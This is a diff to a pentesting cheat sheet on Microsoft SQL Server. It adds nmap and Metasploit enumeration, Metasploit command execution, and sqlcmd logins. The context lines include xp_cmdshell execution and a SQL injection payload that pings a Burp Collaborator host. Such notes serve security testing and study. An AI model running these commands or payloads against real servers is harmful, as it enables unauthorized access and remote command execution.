@@ -7,9 +7,33 @@ description: MSSQL - Microsoft SQL service. typically runs on TCP port 1433.
 ## Enumeration
 
 ```
+//NMAP - enumerate the server, version and info
 nmap [IP]
 nmap --script ms-sql-info -p 1433 [IP]
 nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 [IP]
+
+//Metasploit - enumerate mssql info
+use auxiliary/admin/mssql/mssql_enum
+set RHOSTS [IP]
+exploit
+```
+
+### Enumerate SQL login accounts
+
+```
+// Metasploit - enumerate sql login accounts
+use auxiliary/admin/mssql/mssql_enum_sql_logins
+set RHOSTS [IP]
+exploit
+```
+
+### Enumerate domain accounts
+
+```
+//metasploit
+use auxiliary/admin/mssql/mssql_enum_domain_accounts
+set RHOSTS [IP]
+exploit
 ```
 
 ## Password attack
@@ -60,12 +84,29 @@ EXEC master..xp_cmdshell 'whoami'
 ‘; DECLARE @x AS VARCHAR(100)=’xp_cmdshell’; EXEC @x ‘ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net’ —impacket-mssqlclient machine_name/user@[IP] -windows-auth
 ```
 
+### Metasploit
+
+```
+// Suse auxiliary/admin/mssql/mssql_exec
+set RHOSTS [IP]
+set CMD whoami
+exploit
+```
+
 ## Connecting to MSSQL
 
 ### Using MSSQL-CLI Python utility
 
 ```
 python3 -m mssqlcli.main -S [IP] -U sa -P Password123
+```
+
+### SQLCMD
+
+```
+sqlcmd -S [IP] -U admin -P Password123
+    1> select @@version
+    2> go
 ```
 
 ## Common SQL Queries
